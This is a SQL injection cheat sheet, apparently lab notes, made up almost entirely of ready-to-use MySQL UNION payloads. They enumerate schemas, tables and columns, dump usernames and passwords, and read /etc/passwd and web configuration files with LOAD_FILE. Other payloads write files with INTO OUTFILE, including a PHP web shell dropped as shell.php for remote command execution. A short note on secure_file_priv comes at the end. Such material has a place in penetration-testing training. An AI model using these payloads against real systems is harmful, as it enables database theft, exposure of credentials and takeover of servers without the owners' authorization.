### Database Enumeration
View current database and others
```sql
UNION SELECT 1,database()-- -
UNION SELECT 1,schema_name from INFORMATION_SCHEMA.SCHEMATA-- -
```
View tables from database
```sql
UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.TABLES where table_schema='database_name'-- -
```
View column names within table
```sql
UNION SELECT 1,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='table_name'-- -
```
Dump data
```sql
UNION SELECT username, password from database_name.table_name-- -
```
Test payload
```sql
asd' union select 1,username,password,4 from ilfreight.users-- -
```
### Reading Files
Check current user
```sql
UNION SELECT 1,user()-- -
UNION SELECT 1,current_user()-- -
UNION SELECT 1,user from mysql.user-- -
```
Check super privileges (Y/N)
```sql
UNION SELECT 1, super_priv from mysql.user-- -
UNION SELECT 1, super_priv from mysql.user where user='current_user'-- -
```
Check all privileges (FILE)
```sql
UNION SELECT 1, grantee, privilege_type FROM information_schema.user_privileges
UNION SELECT 1, grantee, privilege_type FROM information_schema.user_privileges where grantee="'root'@'localhost'"-- -
```
Read file with `LOAD_FILE()` (view source code)
```SQL
UNION SELECT 1, LOAD_FILE("/etc/passwd")-- -
UNION SELECT 1, LOAD_FILE("/var/www/html/config.php")-- -
```
Test payload
```sql
asd' union select 1, LOAD_FILE("/var/www/html/config.php"),3,4-- -
```
### RCE & Writing Files
Check value of `secure_file_priv` (empty is good, NULL is bad)
```sql
UNION SELECT 1, variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
Write files using `INTO OUTFILE`
```sql
UNION SELECT 1, 'Pwn3d!' INTO OUTFILE '/var/www/html/leavemehere.txt'-- -
```
RCE via `INTO OUTFILE`
```sql
UNION SELECT null, '<?php system($_REQUEST["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```
Test payload
```sql
asd' UNION SELECT '', '<?php system($_REQUEST["cmd"]); ?>','','' INTO OUTFILE '/var/www/html/shell.php'-- -
```

secure_file_priv may be set as follows:

    If empty, the variable has no effect, which is not a secure setting.
    If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
    If set to NULL, the server disables import and export operations.
